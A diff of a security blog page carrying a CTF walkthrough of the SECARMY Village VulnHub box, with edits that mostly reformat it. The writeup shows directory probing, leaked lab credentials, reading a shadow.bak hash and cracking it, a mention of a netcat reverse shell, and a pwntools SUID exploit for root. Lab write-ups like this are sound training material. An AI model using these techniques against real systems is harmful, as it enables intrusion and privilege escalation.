@@ -56,10 +56,10 @@
     <!-- Windows 8 Tile Icons -->
     <meta name="application-name" content="trollzor's CyberSec blog">
     <meta name="msapplication-TileColor" content="#141414">
-    <meta name="msapplication-square70x70logo" content="smalltile.png" />
-    <meta name="msapplication-square150x150logo" content="mediumtile.png" />
+    <meta name="msapplication-square70x70logo" content="smalltile-2.png" />
+    <meta name="msapplication-square150x150logo" content="mediumtile-2.png" />
     <meta name="msapplication-wide310x150logo" content="widetile.png" />
-    <meta name="msapplication-square310x310logo" content="largetile.png" />
+    <meta name="msapplication-square310x310logo" content="largetile-2.png" />
     
     <!-- Android Lolipop Theme Color -->
     <meta name="theme-color" content="#141414">
@@ -96,7 +96,7 @@
     <h1 class="logo">
         <a href="/">
             
-                trollzor's CyberSec blog 
+                trollzor's CyberSec blog <span class="version">v3.1.0</span>
             
         </a>
     </h1>
@@ -121,12 +121,6 @@
     
       <li>
         <a href="/about">About</a>
-      </li>
-    
-  
-    
-      <li>
-        <a href="/contact">Contact</a>
       </li>
     
   
@@ -159,7 +153,7 @@ November 5, 2020
                         </time>
                     
                     <svg id="clock" class="icon-clock"><use xlink:href="#icon-clock"></use></svg>
-                    <span>5 min to read</span>
+                    <span>6 min to read</span>
                 </p>
                 <h1 class="post-title">SECARMY CTF OSCP box</h1>
                 <p class="post-subtitle"></p>
@@ -175,7 +169,10 @@ November 5, 2020
                 <!-- Add your table of contents here -->
 
 
-                <h3 id="flag-1">Flag 1</h3>
+                <h3 id="context">Context</h3>
+<p>This is a writeup for SECARMY’s CTF OSCP box. The contest has ended, but you can find the VM on Vulnhub: <a href="https://www.vulnhub.com/entry/secarmy-village-grayhat-conference,585/">Download Page</a></p>
+
+<h3 id="flag-1">Flag 1</h3>
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://192.168.100.33
 </code></pre></div></div>
 <p>This gives us the following information: “You are required to find our hidden directory and make your way into the machine.”</p>
@@ -194,16 +191,20 @@ curl http://192.168.100.33/anon/
 
 <h3 id="flag-2">Flag 2</h3>
 <p>We read readme.txt and we get: 
-“You surely can guess the username , the password will be: 4b3l4rd0fru705”
-We try escalation to dos with password 4b3l4rd0fru705 and we get access</p>
+“You surely can guess the username , the password will be: 4b3l4rd0fru705”</p>
+
+<p>We try escalation to dos with password 4b3l4rd0fru705 and we get access</p>
 
 <p>After reading readme.txt we run the following command:</p>
+
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ./files <span class="o">&amp;&amp;</span> <span class="nb">grep</span> <span class="nt">-r</span> a8211ac1853a1235d48829414626512a
+
+file4444.txt:a8211ac1853a1235d48829414626512a
 </code></pre></div></div>
 
-<p>Result: file4444.txt:a8211ac1853a1235d48829414626512a
-Opening file4444.txt tells us to: Look inside file3131.txt
-Getting a base64 encoded text which decoded gives us a zip file to get flag and the next todo instructions</p>
+<p>Opening file4444.txt tells us to: Look inside file3131.txt</p>
+
+<p>file3131.txt gives us a base64 encoded text which decoded gives us a zip file to get flag and the next todo instructions:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
 tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
@@ -222,7 +223,7 @@ unzip flag2.zip <span class="o">&amp;&amp;</span> <span class="nb">cat</span> ./
 </code></pre></div></div>
 
 <h3 id="flag-3">Flag 3</h3>
-<p>We obtain a super secret token from the previous archive and use it on 1337 port</p>
+<p>We obtain a super secret token from the previous archive and use it on 1337 port:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b"</span> | nc 192.168.100.33 1337
 </code></pre></div></div>
@@ -235,13 +236,16 @@ unzip flag2.zip <span class="o">&amp;&amp;</span> <span class="nb">cat</span> ./
 
 <h3 id="flag-4">Flag 4</h3>
 <p>We get a binary which we need to reverse.Using gdb-peda as our reverse tool, we run the binary and close it when it prompts us to enter the key. Because I was unable to breakpoint anywhere in the main function, I tried to find “keywords” that might be in the binary.The command “find ‘credentials’” worked and I got:</p>
+
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mapped : 0x7ffff7ffb09b <span class="o">(</span><span class="s2">"credentials for the fourth user cuatro:p3dr00l1v4r3z"</span><span class="o">)</span>
 </code></pre></div></div>
 
 <h3 id="flag-5">Flag 5</h3>
-<p>The todo.txt tells us to go to /justanothergallery on the webserver
-After analyzing a little bit we get a bunch of qr images in: http://192.168.100.33/justanothergallery/qr/
-Downloading them all and decoding the qr codes with a simple python script gives us the next credentials and flag:</p>
+<p>The todo.txt tells us to go to /justanothergallery on the webserver</p>
+
+<p>After analyzing a little bit we get a bunch of qr images in: http://192.168.100.33/justanothergallery/qr/</p>
+
+<p>Downloading them all and decoding the qr codes with a simple python script gives us the next credentials and flag:</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
 <span class="kn">from</span> <span class="nn">pyzbar.pyzbar</span> <span class="kn">import</span> <span class="n">decode</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -265,9 +269,11 @@ Downloading them all and decoding the qr codes with a simple python script gives
 
 <h3 id="flag-6">Flag 6</h3>
 <p>Reading readme.txt points us to /cincos-secrets/ here we’ll get a shadow.bak file but is not readable. Changing the permissions will give us a hash:</p>
+
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>444 shadow.bak <span class="o">&amp;&amp;</span> <span class="nb">cat </span>shadow.bak | <span class="nb">grep </span>seis
+
+seis:<span class="nv">$6$MCzqLn0Z2KB3X3TM$opQCwc</span>/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::
 </code></pre></div></div>
-<p>Output: seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::</p>
 
 <p>Cracking the hash gives us the password: Hogwarts , so creds: seis:Hogwarts</p>
 
@@ -287,8 +293,9 @@ and setting up a netcat reverse shell on LISTEN-PORT on the attacker box we will
   <span class="n">extracted</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'x'</span><span class="p">)</span><span class="o">^</span><span class="n">key</span><span class="p">)</span>
 
 <span class="k">print</span><span class="p">(</span><span class="n">extracted</span><span class="p">)</span>
+
+<span class="n">Output</span><span class="p">:</span><span class="n">secarmyxoritup</span>
 </code></pre></div></div>
-<p>Output: secarmyxoritup and get the new password: m0d3570v1ll454n4</p>
 
 <h3 id="flag-9">Flag 9</h3>
 <p>We are presented with a pcapng file. Opening it up with wireshark we will get a tcp stream that has a LOT of text in which “QWERTY” is repeated a lot. Also, there were some dns queries to dcode.fr so there is a hint of that too.</p>
@@ -297,10 +304,12 @@ and setting up a netcat reverse shell on LISTEN-PORT on the attacker box we will
 	-QWERTY(US) 
 	-Shift Right + Clockwise rotation</p>
 
-<p>Getting result: 	nueve:355u4z4rc0</p>
+<p>will give us the credentials for the 9th user:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nueve:355u4z4rc0
+</code></pre></div></div>
 
 <h3 id="flag-10">Flag 10</h3>
-<p>We have a suid set binary, so we will need to exploit it to get root. Reversing it and creating a small python exploit script we get root:</p>
+<p>We have a suid set binary, so we will need to exploit it to get root. Reversing it and creating a small python exploit script will do the trick:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
@@ -333,7 +342,7 @@ and setting up a netcat reverse shell on LISTEN-PORT on the attacker box we will
 
         <!-- Add time bar only for pages without pagination -->
         
-            <div class="time-bar" data-minutes="5">
+            <div class="time-bar" data-minutes="6">
     <span class="time-completed"></span>
     <span class="time-remaining"></span>
     <div class="bar">
@@ -504,12 +513,6 @@ and setting up a netcat reverse shell on LISTEN-PORT on the attacker box we will
       </li>
     
   
-    
-      <li>
-        <a href="/contact">Contact</a>
-      </li>
-    
-  
 </ul>
 
 
@@ -531,7 +534,7 @@ and setting up a netcat reverse shell on LISTEN-PORT on the attacker box we will
   "url": "/",
   "logo": {
       "@type": "ImageObject",
-      "url": "/assets/img/icons/mediumtile.png",
+      "url": "/assets/img/icons/mediumtile-2.png",
       "width": "600",
       "height": "315"
   },
@@ -586,7 +589,10 @@ and setting up a netcat reverse shell on LISTEN-PORT on the attacker box we will
             "description": "Writeup of the SECARMY CTF OSCP giveaway box",
             "image": "/assets/img/secarmy-village-0.png",
             "url": "/secarmy-ctf-oscp-box/",
-            "articleBody": "Flag 1
+            "articleBody": "Context
+This is a writeup for SECARMY’s CTF OSCP box. The contest has ended, but you can find the VM on Vulnhub: Download Page
+
+Flag 1
 curl http://192.168.100.33
 
 This gives us the following information: “You are required to find our hidden directory and make your way into the machine.”
@@ -606,15 +612,19 @@ Giving us the credentials for uno user:
 Flag 2
 We read readme.txt and we get: 
 “You surely can guess the username , the password will be: 4b3l4rd0fru705”
+
 We try escalation to dos with password 4b3l4rd0fru705 and we get access
 
 After reading readme.txt we run the following command:
+
 cd ./files &amp;amp;&amp;amp; grep -r a8211ac1853a1235d48829414626512a
 
+file4444.txt:a8211ac1853a1235d48829414626512a
 
-Result: file4444.txt:a8211ac1853a1235d48829414626512a
+
 Opening file4444.txt tells us to: Look inside file3131.txt
-Getting a base64 encoded text which decoded gives us a zip file to get flag and the next todo instructions
+
+file3131.txt gives us a base64 encoded text which decoded gives us a zip file to get flag and the next todo instructions:
 
 echo &quot;UEsDBBQDAAAAADOiO1EAAAAAAAAAAAAAAAALAAAAY2hhbGxlbmdlMi9QSwMEFAMAAAgAFZI2Udrg
 tPY+AAAAQQAAABQAAABjaGFsbGVuZ2UyL2ZsYWcyLnR4dHPOz0svSiwpzUksyczPK1bk4vJILUpV
@@ -633,7 +643,7 @@ unzip flag2.zip &amp;amp;&amp;amp; cat ./challenge2/flag2.txt
 
 
 Flag 3
-We obtain a super secret token from the previous archive and use it on 1337 port
+We obtain a super secret token from the previous archive and use it on 1337 port:
 
 echo &quot;c8e6afe38c2ae9a0283ecfb4e1b7c10f7d96e54c39e727d0e5515ba24a4d1f1b&quot; | nc 192.168.100.33 1337
 
@@ -646,12 +656,15 @@ Which gives us:
 
 Flag 4
 We get a binary which we need to reverse.Using gdb-peda as our reverse tool, we run the binary and close it when it prompts us to enter the key. Because I was unable to breakpoint anywhere in the main function, I tried to find “keywords” that might be in the binary.The command “find ‘credentials’” worked and I got:
+
 mapped : 0x7ffff7ffb09b (&quot;credentials for the fourth user cuatro:p3dr00l1v4r3z&quot;)
 
 
 Flag 5
 The todo.txt tells us to go to /justanothergallery on the webserver
+
 After analyzing a little bit we get a bunch of qr images in: http://192.168.100.33/justanothergallery/qr/
+
 Downloading them all and decoding the qr codes with a simple python script gives us the next credentials and flag:
 from PIL import Image
 from pyzbar.pyzbar import decode
@@ -676,9 +689,11 @@ Hello and congrats for solving this challenge, we hope that you enjoyed the chal
 
 Flag 6
 Reading readme.txt points us to /cincos-secrets/ here we’ll get a shadow.bak file but is not readable. Changing the permissions will give us a hash:
+
 chmod 444 shadow.bak &amp;amp;&amp;amp; cat shadow.bak | grep seis
 
-Output: seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::
+seis:$6$MCzqLn0Z2KB3X3TM$opQCwc/JkRGzfOg/WTve8X/zSQLwVf98I.RisZCFo0mTQzpvc5zqm/0OJ5k.PITcFJBnsn7Nu2qeFP8zkBwx7.:18532:0:99999:7:::
+
 
 Cracking the hash gives us the password: Hogwarts , so creds: seis:Hogwarts
 
@@ -699,7 +714,8 @@ for key in message:
 
 print(extracted)
 
-Output: secarmyxoritup and get the new password: m0d3570v1ll454n4
+Output:secarmyxoritup
+
 
 Flag 9
 We are presented with a pcapng file. Opening it up with wireshark we will get a tcp stream that has a LOT of text in which “QWERTY” is repeated a lot. Also, there were some dns queries to dcode.fr so there is a hint of that too.
@@ -708,10 +724,12 @@ We obtain a password from the long text: mjwfr?2b6j3a5fx/c .Using dcode.fr and u
 	-QWERTY(US) 
 	-Shift Right + Clockwise rotation
 
-Getting result: 	nueve:355u4z4rc0
+will give us the credentials for the 9th user:
+nueve:355u4z4rc0
+
 
 Flag 10
-We have a suid set binary, so we will need to exploit it to get root. Reversing it and creating a small python exploit script we get root:
+We have a suid set binary, so we will need to exploit it to get root. Reversing it and creating a small python exploit script will do the trick:
 
 from pwn import *
 
@@ -723,7 +741,7 @@ io.sendline(payload)
 io.interactive()
 
 ",
-            "wordcount": "1057",
+            "wordcount": "1093",
             "inLanguage": "en",
             "dateCreated": "2020-11-05/",
             "datePublished": "2020-11-05/",
@@ -746,7 +764,7 @@ io.interactive()
                 "url": "/",
                 "logo": {
                     "@type": "ImageObject",
-                    "url": "/assets/img/blog-image.png",
+                    "url": "/assets/img/blog-image-2.png",
                     "width": "600",
                     "height": "315"
                 }
